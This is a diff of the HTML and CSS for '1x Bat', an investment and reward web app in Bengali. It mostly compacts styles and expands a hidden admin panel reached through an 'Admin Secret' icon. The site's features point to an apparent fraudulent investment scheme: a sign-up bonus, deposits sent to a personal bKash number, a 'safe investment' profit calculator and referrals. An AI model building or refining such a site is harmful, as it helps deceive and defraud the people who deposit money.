@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>1x Bat – Professional Investment & Reward Platform</title>
+<title>1x Bat – Professional Investment & Reward Platform V2</title>
 <style>
 :root{
   --bg:#020704;
@@ -26,311 +26,99 @@ html,body{
   background:radial-gradient(circle at 50% -10%,#12452f 0,#04110b 35%,#010302 80%);
 }
 body{overflow-x:hidden;padding-bottom:70px}
-.page{
-  width:100%;
-  max-width:460px;
-  margin:auto;
-  min-height:100vh;
-  padding:18px 16px 42px;
-  position:relative;
-}
-.ambient{
-  position:fixed;
-  inset:0;
-  pointer-events:none;
-  overflow:hidden;
-  z-index:0;
-}
-.orb{
-  position:absolute;
-  border-radius:50%;
-  filter:blur(10px);
-  opacity:.16;
-  animation:orbFloat 8s ease-in-out infinite;
-}
+.page{width:100%;max-width:460px;margin:auto;min-height:100vh;padding:18px 16px 42px;position:relative;}
+.ambient{position:fixed;inset:0;pointer-events:none;overflow:hidden;z-index:0;}
+.orb{position:absolute;border-radius:50%;filter:blur(10px);opacity:.16;animation:orbFloat 8s ease-in-out infinite;}
 .orb.one{width:180px;height:180px;background:#2dffab;left:-80px;top:12%}
 .orb.two{width:140px;height:140px;background:#ffd34d;right:-60px;top:42%;animation-delay:-3s}
 .orb.three{width:200px;height:200px;background:#1cff8d;left:20%;bottom:-110px;animation-delay:-5s}
-@keyframes orbFloat{
-  0%,100%{transform:translateY(0) scale(1)}
-  50%{transform:translateY(-24px) scale(1.06)}
-}
+@keyframes orbFloat{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-24px) scale(1.06)}}
 .content{position:relative;z-index:1}
 
 .notice-bar{
   background:linear-gradient(135deg,#1f4e38,#0d2b1e);
   border:1px solid rgba(27,224,146,.3);
-  border-radius:14px;
-  padding:10px 14px;
-  margin-bottom:12px;
-  font-size:12px;
-  color:var(--gold);
-  display:flex;
-  align-items:center;
-  gap:10px;
-  box-shadow:0 8px 20px rgba(0,0,0,.3);
+  border-radius:14px;padding:10px 14px;margin-bottom:12px;font-size:12px;color:var(--gold);
+  display:flex;align-items:center;gap:10px;box-shadow:0 8px 20px rgba(0,0,0,.3);
 }
-
 .top-badge{
-  position:relative;
-  overflow:hidden;
-  display:flex;
-  justify-content:space-between;
-  align-items:center;
-  padding:15px 16px;
-  margin-bottom:13px;
-  border-radius:20px;
+  position:relative;display:flex;justify-content:space-between;align-items:center;
+  padding:15px 16px;margin-bottom:13px;border-radius:20px;
   border:1px solid rgba(255,211,77,.26);
   background:linear-gradient(135deg,#0e3021,#0a1a12);
   box-shadow:0 16px 42px rgba(0,0,0,.28);
 }
-.brand{
-  font-weight:1000;
-  font-size:18px;
-  letter-spacing:.5px;
-  color:#fff;
-}
+.brand{font-weight:1000;font-size:18px;letter-spacing:.5px;color:#fff;}
 .brand span{color:var(--gold)}
 .top-icons{display:flex;gap:12px;font-size:18px;cursor:pointer;}
 .hero{
-  position:relative;
-  overflow:hidden;
-  padding:24px 18px 22px;
-  border-radius:30px;
-  text-align:center;
+  position:relative;padding:24px 18px 22px;border-radius:30px;text-align:center;
   background:linear-gradient(155deg,#11563a,#07301f 48%,#06180f);
-  border:1px solid rgba(255,211,77,.26);
-  box-shadow:0 26px 70px rgba(0,0,0,.42);
+  border:1px solid rgba(255,211,77,.26);box-shadow:0 26px 70px rgba(0,0,0,.42);
 }
-.gift{
-  width:64px;height:64px;
-  margin:auto;
-  display:grid;place-items:center;
-  border-radius:20px;
-  font-size:32px;
-  background:linear-gradient(145deg,#ffd958,#e69b00);
-  box-shadow:0 14px 35px rgba(255,193,31,.25);
-}
-.hero .welcome{
-  margin-top:12px;
-  letter-spacing:2px;
-  font-size:11px;
-  font-weight:900;
-  color:#caffea;
-}
-.money{
-  display:inline-block;
-  margin:8px 0;
-  font-size:42px;
-  line-height:1;
-  font-weight:1000;
-  color:var(--gold);
-}
+.gift{width:64px;height:64px;margin:auto;display:grid;place-items:center;border-radius:20px;font-size:32px;background:linear-gradient(145deg,#ffd958,#e69b00);box-shadow:0 14px 35px rgba(255,193,31,.25);}
+.hero .welcome{margin-top:12px;letter-spacing:2px;font-size:11px;font-weight:900;color:#caffea;}
+.money{display:inline-block;margin:8px 0;font-size:42px;line-height:1;font-weight:1000;color:var(--gold);}
 
 .bottom-nav{
-  position:fixed;
-  bottom:0; left:50%;
-  transform:translateX(-50%);
-  width:100%; max-width:460px;
-  background:#05120b;
-  border-top:1px solid var(--line);
-  display:flex;
-  justify-content:space-around;
-  padding:10px 4px;
-  z-index:50;
+  position:fixed;bottom:0;left:50%;transform:translateX(-50%);width:100%;max-width:460px;
+  background:#05120b;border-top:1px solid var(--line);display:flex;justify-content:space-around;padding:10px 4px;z-index:50;
 }
-.nav-item{
-  background:none; border:0;
-  color:var(--muted);
-  font-size:10px;
-  font-weight:bold;
-  text-align:center;
-  cursor:pointer;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  gap:2px;
-}
+.nav-item{background:none;border:0;color:var(--muted);font-size:10px;font-weight:bold;text-align:center;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:2px;}
 .nav-item span.ico-nav{font-size:18px;}
 .nav-item.active{color:var(--green);}
 
 .card{
-  margin-top:15px;
-  padding:20px 16px;
-  border-radius:26px;
+  margin-top:15px;padding:20px 16px;border-radius:26px;
   background:linear-gradient(180deg,rgba(12,27,19,.98),rgba(4,12,8,.98));
-  border:1px solid var(--line);
-  box-shadow:0 25px 65px rgba(0,0,0,.38);
+  border:1px solid var(--line);box-shadow:0 25px 65px rgba(0,0,0,.38);
 }
-.head{
-  display:flex;
-  align-items:center;
-  gap:12px;
-  margin-bottom:15px;
-}
-.head-icon{
-  width:42px;height:42px;
-  display:grid;place-items:center;
-  border-radius:14px;
-  font-size:20px;
-  background:linear-gradient(145deg,#123d2b,#0b251a);
-  border:1px solid #295c43;
-}
+.head{display:flex;align-items:center;gap:12px;margin-bottom:15px;}
+.head-icon{width:42px;height:42px;display:grid;place-items:center;border-radius:14px;font-size:20px;background:linear-gradient(145deg,#123d2b,#0b251a);border:1px solid #295c43;}
 .head h2{margin:0;font-size:18px}
 .head p{margin:2px 0 0;color:var(--muted);font-size:11px}
-.msg{
-  display:none;
-  padding:12px 13px;
-  margin-bottom:13px;
-  border-radius:14px;
-  font-size:12px;
-  line-height:1.55;
-  animation:fadeIn .3s ease;
-}
-@keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+.msg{display:none;padding:12px 13px;margin-bottom:13px;border-radius:14px;font-size:12px;line-height:1.55;}
 .msg.error{display:block;color:#ffb0ba;background:#35161b;border:1px solid #7b3540}
 .msg.success,.msg.ok{display:block;background:#0b2a1d;border:1px solid #24684d;color:#88f3c4}
 .field{margin-bottom:14px}
-.label{
-  display:block;
-  margin:0 0 7px 4px;
-  color:#c3d0c9;
-  font-size:12px;
-  font-weight:800;
-}
+.label{display:block;margin:0 0 7px 4px;color:#c3d0c9;font-size:12px;font-weight:800;}
 .input-wrap{position:relative}
-.ico{
-  position:absolute;
-  left:15px;top:50%;
-  transform:translateY(-50%);
-  font-size:18px;
-}
-input, select{
-  width:100%;
-  height:52px;
-  padding:0 14px 0 46px;
-  border-radius:15px;
-  border:1px solid #294338;
-  background:#06100b;
-  color:#fff;
-  outline:none;
-  font-size:14px;
-}
+.ico{position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:18px;}
+input, select{width:100%;height:52px;padding:0 14px 0 46px;border-radius:15px;border:1px solid #294338;background:#06100b;color:#fff;outline:none;font-size:14px;}
 input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27,224,146,.08)}
 .allow-btn{
-  position:relative;
-  overflow:hidden;
-  width:100%;
-  height:58px;
-  margin-top:8px;
-  border:0;
-  border-radius:17px;
-  cursor:pointer;
-  color:#062115;
+  position:relative;width:100%;height:58px;margin-top:8px;border:0;border-radius:17px;cursor:pointer;color:#062115;
   background:linear-gradient(135deg,#f8d650 0%,#ffc52b 42%,#24e79f 100%);
-  box-shadow:0 15px 36px rgba(24,205,137,.2);
-  font-weight:1000;
-  font-size:16px;
+  box-shadow:0 15px 36px rgba(24,205,137,.2);font-weight:1000;font-size:16px;
 }
 .allow-btn:disabled{filter:saturate(.45);cursor:not-allowed}
-.btn-inner{
-  position:relative;
-  z-index:2;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  gap:10px;
-}
-.task-item, .plan-item, .tx-item{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  padding:14px;
-  margin-bottom:10px;
-  border-radius:15px;
-  background:#06110b;
-  border:1px solid #20392d;
-}
-.task-btn{
-  padding:8px 14px;
-  border-radius:10px;
-  font-weight:900;
-  font-size:11px;
-  border:0;
-  background:var(--green);
-  color:#062015;
-  cursor:pointer;
-  text-decoration:none;
-  display:inline-block;
-}
+.btn-inner{position:relative;z-index:2;display:flex;align-items:center;justify-content:center;gap:10px;}
+.task-item, .plan-item, .tx-item{display:flex;align-items:center;justify-content:space-between;padding:14px;margin-bottom:10px;border-radius:15px;background:#06110b;border:1px solid #20392d;}
+.task-btn{padding:8px 14px;border-radius:10px;font-weight:900;font-size:11px;border:0;background:var(--green);color:#062015;cursor:pointer;text-decoration:none;display:inline-block;}
 
-.deposit-card-box{
-  background:#06100b;
-  border:1px solid #20392d;
-  border-radius:16px;
-  padding:16px;
-  margin-bottom:15px;
-}
-.payment-badge{
-  display:inline-block;
-  padding:4px 10px;
-  border-radius:8px;
-  font-size:12px;
-  font-weight:bold;
-  background:#113725;
-  color:#78efba;
-  margin-bottom:8px;
-}
-.amount-chip{
-  padding:8px 12px;
-  border-radius:10px;
-  border:1px solid #294338;
-  background:#06100b;
-  color:#fff;
-  font-weight:bold;
-  cursor:pointer;
-  font-size:13px;
-}
+.deposit-card-box{background:#06100b;border:1px solid #20392d;border-radius:16px;padding:16px;margin-bottom:15px;}
+.payment-badge{display:inline-block;padding:4px 10px;border-radius:8px;font-size:12px;font-weight:bold;background:#113725;color:#78efba;margin-bottom:8px;}
+.amount-chip{padding:8px 12px;border-radius:10px;border:1px solid #294338;background:#06100b;color:#fff;font-weight:bold;cursor:pointer;font-size:13px;}
 .amount-chip:hover,.amount-chip.active{border-color:var(--green);background:#0b2a1d;color:var(--green);}
 
-/* Admin Styles */
+/* Advanced Admin Modal & Panel Styles */
 .admin-modal,.admin-panel{display:none}
-.admin-modal{
-  position:fixed;inset:0;z-index:100;
-  background:rgba(0,0,0,.82);
-  backdrop-filter:blur(10px);
-  align-items:center;justify-content:center;
-  padding:18px;
-}
+.admin-modal{position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.82);backdrop-filter:blur(10px);align-items:center;justify-content:center;padding:18px;}
 .admin-modal.show{display:flex}
-.admin-login{
-  width:min(100%,390px);
-  padding:20px;border-radius:24px;
-  background:#08140e;border:1px solid #2a5a42;
-}
+.admin-login{width:min(100%,390px);padding:20px;border-radius:24px;background:#08140e;border:1px solid #2a5a42;}
 .admin-login h3{margin:0 0 5px;font-size:20px}
 .admin-login p{margin:0 0 15px;color:var(--muted);font-size:12px}
 .admin-actions{display:flex;gap:9px}
-.admin-secondary{
-  width:100%;height:50px;border-radius:14px;
-  border:1px solid #33483e;background:#111b16;
-  color:#fff;font-weight:900;cursor:pointer;
-}
-.admin-panel{
-  position:fixed;inset:0;z-index:90;
-  overflow:auto;background:#031008;
-  padding:14px;
-}
+.admin-secondary{width:100%;height:50px;border-radius:14px;border:1px solid #33483e;background:#111b16;color:#fff;font-weight:900;cursor:pointer;}
+.admin-panel{position:fixed;inset:0;z-index:90;overflow:auto;background:#031008;padding:14px;}
 .admin-panel.show{display:block}
-.admin-shell{max-width:900px;margin:auto}
-.admin-top{
-  display:flex;align-items:center;justify-content:space-between;
-  gap:10px;margin-bottom:12px;
-}
+.admin-shell{max-width:980px;margin:auto}
+.admin-top{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-bottom:12px;}
 .admin-top h2{margin:0;font-size:21px}
-.admin-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:9px}
+.admin-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:9px}
+@media(max-width:768px){.admin-grid{grid-template-columns:repeat(2,1fr)}}
 .stat{padding:14px;border-radius:16px;background:#0a1710;border:1px solid #213d2f}
-.stat b{display:block;font-size:22px;color:#fff}
+.stat b{display:block;font-size:18px;color:#fff}
 .stat span{font-size:10px;color:var(--muted)}
 .admin-card{margin-top:11px;padding:15px;border-radius:19px;background:#08140e;border:1px solid #203a2d}
 .admin-card h3{margin:0 0 12px}
@@ -339,13 +127,10 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 .record-top{display:flex;align-items:flex-start;justify-content:space-between;gap:10px}
 .record h4{margin:0 0 6px}
 .record .meta{color:#9db0a5;font-size:11px;line-height:1.65}
-.badge{
-  padding:5px 8px;border-radius:99px;
-  font-size:9px;font-weight:1000;
-  background:#113725;color:#78efba;white-space:nowrap;
-}
+.badge{padding:5px 8px;border-radius:99px;font-size:9px;font-weight:1000;background:#113725;color:#78efba;white-space:nowrap;}
 .badge.pending{background:#3b2a11;color:#ffda73}
 .badge.rejected{background:#35161b;color:#ff9fab}
+.badge.blocked{background:#35161b;color:#ff7587}
 .admin-btn{border:0;border-radius:10px;padding:9px 11px;font-weight:900;cursor:pointer}
 .admin-green{background:#19df92;color:#062015}
 .admin-dark{background:#15211b;color:#fff;border:1px solid #30483d}
@@ -360,25 +145,15 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 </head>
 <body>
 
-<div class="ambient">
-  <div class="orb one"></div>
-  <div class="orb two"></div>
-  <div class="orb three"></div>
-</div>
+<div class="ambient"><div class="orb one"></div><div class="orb two"></div><div class="orb three"></div></div>
 
 <main class="page">
   <div class="content">
-
-    <div class="notice-bar" id="highlightNoticeBar">
-      <span>📢</span> <span id="noticeBarText">সিস্টেম আপডেট সফল হয়েছে। নতুন প্রিমিয়াম ফিচার উপভোগ করুন!</span>
-    </div>
+    <div class="notice-bar" id="highlightNoticeBar"><span>📢</span> <span id="noticeBarText">সিস্টেম আপডেট সফল হয়েছে। নতুন প্রিমিয়াম ফিচার উপভোগ করুন!</span></div>
 
     <section class="top-badge">
-      <div class="brand">1x Bat <span>V2 BONUS</span></div>
-      <div class="top-icons">
-        <span onclick="openNotificationModal()" title="Notifications">🔔</span>
-        <span id="adminTapTarget" title="Admin Secret" style="cursor:pointer;">🛡️</span>
-      </div>
+      <div class="brand">1x Bat <span>V2 PRO</span></div>
+      <div class="top-icons"><span onclick="openNotificationModal()">🔔</span><span id="adminTapTarget" title="Admin Secret" style="cursor:pointer;">🛡️</span></div>
     </section>
 
     <section class="hero">
@@ -388,7 +163,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
       <p id="heroSubText" style="color:var(--muted);font-size:12px;">নিরাপদ রিওয়ার্ড এবং প্রিমিয়াম ইনভেস্টমেন্ট সিস্টেম</p>
     </section>
 
-    <!-- AUTH & REGISTRATION VIEW -->
+    <!-- AUTH VIEW -->
     <div id="authView">
       <div class="card" id="loginCard" style="display:none;">
         <div class="head"><div class="head-icon">🔑</div><div><h2>অ্যাকাউন্ট লগইন</h2><p>আপনার মোবাইল নাম্বার ও পাসওয়ার্ড দিন</p></div></div>
@@ -411,7 +186,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
       </section>
 
       <section class="card" id="paymentStep" style="display:none;">
-        <div class="head"><div class="head-icon">💳</div><div><h2>পেমেন্ট মেথড</h2><p>৳100 বোনাস গ্রহণের মাধ্যম নির্বাচন করুন</p></div></div>
+        <div class="head"><div class="head-icon">💳</div><div><h2>পেমেন্ট মেথড</h2><p>বোনাস গ্রহণের মাধ্যম নির্বাচন করুন</p></div></div>
         <div class="msg" id="paymentMsg"></div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px;">
           <label style="border:1px solid var(--line);padding:14px;border-radius:14px;text-align:center;cursor:pointer;background:#06100b;"><input type="radio" name="payment" value="bKash" checked> 📱 bKash</label>
@@ -429,79 +204,71 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
       </section>
     </div>
 
-    <!-- MAIN DASHBOARD TABS -->
+    <!-- DASHBOARD VIEW -->
     <div id="dashboardView" class="hidden">
-      <!-- HOME TAB -->
       <div id="paneHome" class="card">
-        <div class="head"><div class="head-icon">📊</div><div><h2>অ্যাকাউন্ট ওভারভিউ</h2><p>আপনার ব্যালেন্স এবং রেফারেল সামারি</p></div></div>
+        <div class="head"><div class="head-icon">📊</div><div><h2>অ্যাকাউন্ট ওভারভিউ</h2><p>আপনার ব্যালেন্স এবং সামারি</p></div></div>
         <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
           <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);"><small style="color:var(--muted)">Total Balance</small><b id="dashTotalEarned" style="display:block;font-size:18px;color:var(--gold);margin-top:4px;">৳100</b></div>
           <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);"><small style="color:var(--muted)">Referrals</small><b id="dashReferralCount" style="display:block;font-size:16px;color:var(--green);margin-top:4px;">0 Users</b></div>
         </div>
       </div>
 
-      <!-- PREMIUM DEPOSIT TAB -->
       <div id="paneDeposit" class="card hidden">
-        <div class="head"><div class="head-icon">💳</div><div><h2>Deposit System</h2><p>বিকাশ ও নগদের মাধ্যমে টপ-আপ করুন</p></div></div>
+        <div class="head"><div class="head-icon">💳</div><div><h2>Deposit System</h2><p>টপ-আপ করুন</p></div></div>
         <div class="msg" id="depositMsg"></div>
         <div class="deposit-card-box">
           <div class="payment-badge" id="depositMethodBadge">bKash Personal</div>
           <p style="font-size:12px;color:var(--muted);margin:0 0 8px;">নিচের নাম্বারে সেন্ড মানি করুন:</p>
           <div style="display:flex;align-items:center;justify-content:space-between;background:#030805;padding:10px 14px;border-radius:12px;border:1px solid #1a3326;">
             <b id="adminWalletDisplay" style="font-size:16px;letter-spacing:1px;color:var(--gold);">01700000000</b>
-            <button class="task-btn" onclick="copyAdminNumber()">Copy Number</button>
+            <button class="task-btn" onclick="copyAdminNumber()">Copy</button>
           </div>
         </div>
-        <div class="field"><label class="label">ডিপোজিট মাধ্যম</label><select id="depositMethod" onchange="updateAdminWalletDisplay()"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select></div>
-        <div class="field"><label class="label">টাকার পরিমাণ (৳)</label><input id="depositAmount" type="number" placeholder="সর্বনিম্ন ১০০ টাকা"></div>
+        <div class="field"><label class="label">মাধ্যম</label><select id="depositMethod" onchange="updateAdminWalletDisplay()"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select></div>
+        <div class="field"><label class="label">পরিমাণ (৳)</label><input id="depositAmount" type="number" placeholder="ন্যূনতম ১০০ টাকা"></div>
         <div class="field"><label class="label">Transaction ID (TrxID)</label><input id="depositTrxId" type="text" placeholder="যেমন: 9N7A6..."></div>
         <button class="allow-btn" onclick="submitDeposit()"><span class="btn-inner"><span>SUBMIT DEPOSIT →</span></span></button>
       </div>
 
-      <!-- PREMIUM INVEST TAB -->
       <div id="paneInvest" class="card hidden">
-        <div class="head"><div class="head-icon">📈</div><div><h2>Premium Investment</h2><p>লাভজনক ও নিরাপদ বিনিয়োগ করুন</p></div></div>
+        <div class="head"><div class="head-icon">📈</div><div><h2>Premium Investment</h2><p>নিরাপদ বিনিয়োগ করুন</p></div></div>
         <div class="msg" id="investMsg"></div>
         <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);margin-bottom:15px;">
-          <h4 style="margin:0 0 8px;font-size:14px;">🧮 Profit Calculator & Amount</h4>
+          <h4 style="margin:0 0 8px;font-size:14px;">🧮 Profit Calculator</h4>
           <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;">
             <button class="amount-chip" onclick="setInvestAmount(500, this)">৳500</button>
             <button class="amount-chip" onclick="setInvestAmount(1000, this)">৳1,000</button>
-            <button class="amount-chip" onclick="setInvestAmount(2000, this)">৳2,000</button>
             <button class="amount-chip" onclick="setInvestAmount(5000, this)">৳5,000</button>
           </div>
-          <div class="field" style="margin-bottom:10px;"><label class="label">বিনিয়োগের পরিমাণ (৳)</label><input id="calcAmount" type="number" placeholder="পরিমাণ লিখুন" oninput="calculateProfitPreview()"></div>
+          <div class="field" style="margin-bottom:10px;"><label class="label">পরিমাণ (৳)</label><input id="calcAmount" type="number" placeholder="পরিমাণ" oninput="calculateProfitPreview()"></div>
           <div style="background:#06100b;padding:12px;border-radius:10px;border:1px solid #1c3328;font-size:12px;line-height:1.7;" id="calcPreviewBox">
-            বিনিয়োগ: <b>৳0</b> | সম্ভাব্য মুনাফা: <b style="color:var(--green)">৳0</b><br>মোট প্রাপ্য (মূলধন + লাভ): <b style="color:var(--gold)">৳0</b>
+            বিনিয়োগ: <b>৳0</b> | সম্ভাব্য মুনাফা: <b style="color:var(--green)">৳0</b>
           </div>
         </div>
-        <button class="allow-btn" id="investNowBtn" onclick="openInvestConfirmation()"><span class="btn-inner"><span>INVEST NOW →</span></span></button>
-        <div style="margin-top:20px;"><h4 style="margin:0 0 10px;font-size:15px;">📜 আপনার ইনভেস্টমেন্ট হিস্ট্রি</h4><div id="userInvestmentsContainer"><div class="admin-note">লোড হচ্ছে...</div></div></div>
+        <button class="allow-btn" onclick="openInvestConfirmation()"><span class="btn-inner"><span>INVEST NOW →</span></span></button>
+        <div style="margin-top:20px;"><h4 style="margin:0 0 10px;font-size:15px;">📜 ইনভেস্টমেন্ট হিস্ট্রি</h4><div id="userInvestmentsContainer"><div class="admin-note">লোড হচ্ছে...</div></div></div>
       </div>
 
-      <!-- PROMO TASKS TAB -->
       <div id="paneTasks" class="card hidden">
-        <div class="head"><div class="head-icon">📋</div><div><h2>Promo Tasks</h2><p>টাস্ক সম্পন্ন করে রিওয়ার্ড অর্জন করুন</p></div></div>
+        <div class="head"><div class="head-icon">📋</div><div><h2>Promo Tasks</h2><p>টাস্ক সম্পন্ন করুন</p></div></div>
         <div id="promoTasksListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
       </div>
 
-      <!-- WITHDRAW TAB -->
       <div id="paneWithdraw" class="card hidden">
-        <div class="head"><div class="head-icon">💸</div><div><h2>Withdraw Funds</h2><p>বিকাশ বা নগদের মাধ্যমে টাকা তুলুন</p></div></div>
+        <div class="head"><div class="head-icon">💸</div><div><h2>Withdraw Funds</h2><p>টাকা তুলুন</p></div></div>
         <div class="msg" id="withdrawMsg"></div>
         <div class="field"><label class="label">মেথড</label><select id="withdrawMethod"><option value="bKash">📱 bKash</option><option value="Nagad">💳 Nagad</option></select></div>
         <div class="field"><label class="label">নাম্বার</label><input id="withdrawNumber" type="tel" maxlength="11" placeholder="01XXXXXXXXX"></div>
-        <div class="field"><label class="label">পরিমাণ (৳)</label><input id="withdrawAmount" type="number" placeholder="সর্বনিম্ন ৫০০ টাকা"></div>
+        <div class="field"><label class="label">পরিমাণ (৳)</label><input id="withdrawAmount" type="number" placeholder="ন্যূনতম ৫০০ টাকা"></div>
         <button class="allow-btn" onclick="submitWithdraw()"><span class="btn-inner"><span>SUBMIT WITHDRAW →</span></span></button>
       </div>
 
-      <!-- WALLET TAB -->
       <div id="paneWallet" class="card hidden">
-        <div class="head"><div class="head-icon">📜</div><div><h2>Transaction History</h2><p>সমস্ত লেনদেনের বিবরণ</p></div></div>
+        <div class="head"><div class="head-icon">📜</div><div><h2>Transaction History</h2><p>লেনদেনের বিবরণ</p></div></div>
         <div id="transactionListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
       </div>
 
-      <!-- PROFILE TAB -->
       <div id="paneProfile" class="card hidden">
         <div class="head"><div class="head-icon">⚙️</div><div><h2>User Profile</h2><p>অ্যাকাউন্ট সেটিংস</p></div></div>
         <div style="font-size:13px; line-height:1.8; color:var(--muted); margin-bottom:15px;" id="profileDetails">লোডিং...</div>
@@ -515,16 +282,15 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
 <div class="admin-modal" id="investConfirmModal">
   <div class="admin-login">
     <h3>📈 Investment Confirmation</h3>
-    <p>নিচের বিবরণ যাচাই করুন</p>
     <div style="background:#05120b;padding:14px;border-radius:14px;border:1px solid var(--line);font-size:13px;line-height:1.8;margin-bottom:15px;" id="confirmModalBody"></div>
     <div class="admin-actions">
       <button class="admin-secondary" onclick="$('investConfirmModal').classList.remove('show')">CANCEL</button>
-      <button class="allow-btn" id="confirmInvestBtn" style="height:50px;margin:0;" onclick="confirmAndSubmitInvestment()">CONFIRM INVEST</button>
+      <button class="allow-btn" id="confirmInvestBtn" style="height:50px;margin:0;" onclick="confirmAndSubmitInvestment()">CONFIRM</button>
     </div>
   </div>
 </div>
 
-<!-- BOTTOM NAVIGATION BAR -->
+<!-- BOTTOM NAV -->
 <nav class="bottom-nav hidden" id="bottomNavBar">
   <button class="nav-item active" id="navHome" onclick="switchTab('home')"><span class="ico-nav">🏠</span>Home</button>
   <button class="nav-item" id="navDeposit" onclick="switchTab('deposit')"><span class="ico-nav">💳</span>Deposit</button>
@@ -535,7 +301,7 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   <button class="nav-item" id="navProfile" onclick="switchTab('profile')"><span class="ico-nav">👤</span>Profile</button>
 </nav>
 
-<!-- ADMIN MODAL LOGIN -->
+<!-- ADMIN LOGIN MODAL -->
 <div class="admin-modal" id="adminModal">
   <div class="admin-login">
     <h3>🔐 Admin Access</h3>
@@ -549,33 +315,37 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
   </div>
 </div>
 
-<!-- MASTER ADMIN PANEL -->
+<!-- ADVANCED MASTER ADMIN PANEL -->
 <section class="admin-panel" id="adminPanel">
   <div class="admin-shell">
     <div class="admin-top">
-      <div><h2>🛡️ Master Admin Panel</h2><small>System Control Center</small></div>
-      <button class="admin-btn admin-dark" onclick="$('adminPanel').classList.remove('show')">Close Panel</button>
+      <div><h2>🛡️ Advanced Master Admin Panel</h2><small>System Control & Audit Center</small></div>
+      <button class="admin-btn admin-dark" onclick="$('adminPanel').classList.remove('show')">Close</button>
     </div>
 
-    <!-- Admin Stats -->
+    <!-- Financial Stats & Reports -->
     <div class="admin-grid">
       <div class="stat"><b id="adStatUsers">0</b><span>Total Users</span></div>
-      <div class="stat"><b id="adStatDeposits">৳0</b><span>Total Deposits</span></div>
-      <div class="stat"><b id="adStatWithdraws">৳0</b><span>Total Withdraws</span></div>
+      <div class="stat"><b id="adStatDeposits">৳0</b><span>Approved Deposits</span></div>
+      <div class="stat"><b id="adStatWithdraws">৳0</b><span>Approved Withdraws</span></div>
+      <div class="stat"><b id="adStatNet">৳0</b><span>Net Balance Flow</span></div>
     </div>
 
-    <!-- Admin Sub Tabs -->
+    <!-- Admin Tabs -->
     <div class="admin-tabs" style="margin-top:14px;">
-      <button class="admin-tab-btn active" id="adTabBtnUsers" onclick="switchAdminTab('users')">👥 Users</button>
+      <button class="admin-tab-btn active" id="adTabBtnUsers" onclick="switchAdminTab('users')">👥 Users & Audit</button>
       <button class="admin-tab-btn" id="adTabBtnDeposits" onclick="switchAdminTab('deposits')">💳 Deposits</button>
       <button class="admin-tab-btn" id="adTabBtnWithdraws" onclick="switchAdminTab('withdraws')">💸 Withdraws</button>
-      <button class="admin-tab-btn" id="adTabBtnTasks" onclick="switchAdminTab('tasks')">📋 Manage Tasks</button>
-      <button class="admin-tab-btn" id="adTabBtnSettings" onclick="switchAdminTab('settings')">⚙️ Settings & Bot</button>
+      <button class="admin-tab-btn" id="adTabBtnTasks" onclick="switchAdminTab('tasks')">📋 Tasks</button>
+      <button class="admin-tab-btn" id="adTabBtnReports" onclick="switchAdminTab('reports')">📊 Reports</button>
+      <button class="admin-tab-btn" id="adTabBtnSettings" onclick="switchAdminTab('settings')">⚙️ Settings & DB</button>
+      <button class="admin-tab-btn" id="adTabBtnActivity" onclick="switchAdminTab('activity')">📜 Activity Logs</button>
     </div>
 
     <!-- USERS TAB -->
     <div id="adPaneUsers" class="admin-card">
-      <h3>👥 All Registered Users (Location View)</h3>
+      <h3>👥 User Search, Block & Balance Adjustment</h3>
+      <div class="field"><input class="admin-search" id="adminUserSearchInput" type="text" placeholder="Search by Name or Phone..." oninput="filterAdminUsers()"></div>
       <div id="adminUserListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
     </div>
 
@@ -591,22 +361,30 @@ input:focus, select:focus{border-color:var(--green);box-shadow:0 0 0 4px rgba(27
       <div id="adminWithdrawListContainer"><div class="admin-note">লোড হচ্ছে...</div></div>
     </div>
 
-    <!-- TASKS MANAGEMENT TAB -->
+    <!-- TASKS TAB -->
     <div id="adPaneTasks" class="admin-card hidden">
-      <h3>📋 Add & Manage Promo Tasks</h3>
-      <div class="field"><label class="label">Task Title</label><input class="admin-search" id="newTaskTitle" type="text" placeholder="যেমন: Telegram Channel Join"></div>
-      <div class="field"><label class="label">Task URL</label><input class="admin-search" id="newTaskUrl" type="text" placeholder="https://t.me/..."></div>
-      <div class="field"><label class="label">Reward Amount (৳)</label><input class="admin-search" id="newTaskReward" type="number" placeholder="45"></div>
-      <button class="admin-btn admin-green" onclick="addNewPromoTask()">ADD NEW TASK</button>
+      <h3>📋 Manage Promo Tasks</h3>
+      <div class="field"><label class="label">Title</label><input class="admin-search" id="newTaskTitle" type="text"></div>
